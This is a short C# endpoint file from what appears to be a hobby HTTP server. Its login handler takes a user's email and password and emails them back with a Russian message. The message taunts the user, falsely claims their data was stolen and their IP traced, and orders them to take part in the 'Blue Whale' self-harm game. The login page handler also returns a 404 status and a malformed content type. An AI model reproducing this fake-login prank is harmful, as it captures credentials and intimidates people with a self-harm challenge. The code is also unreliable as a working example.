using MiniHTTPServer2.Core.Attributes;
using MiniHTTPServer2.Services;
using System.Net;

namespace MiniHTTPServer2.Endpoints
{
    [Endpoint]
    internal class AuthEndpoint
    {
        //Get /auth/
        [HttpGet]
        public void LoginPage(HttpListenerContext context)
        {
            string html = File.ReadAllText("C:/Users/gamza/source/repos/MiniHTTPServer2/MiniHTTPServer2/Static/Index.html");
            context.Response.StatusCode = (int)HttpStatusCode.NotFound;
            context.Response.ContentType = "text/html, charset=utf-8";
            using var writer = new StreamWriter(context.Response.OutputStream);
            writer.Write(html);
            writer.Flush();
            context.Response.Close();
        }
        //Post /auth/
        [HttpPost]
        public void Login(string email, string password)
        {
            string title = "Ваши данные ukrali";
            string message = $"Здарова лошара, твои данные украли твоё ip вычеслили ты попал в игру синий кит и ты обязан " +
                $"нарисовать на руке синего кита, твои почта: {email}, твой пароль:{password}";
            EmailService.SendEmail(email, title, message);
        }
    }
}
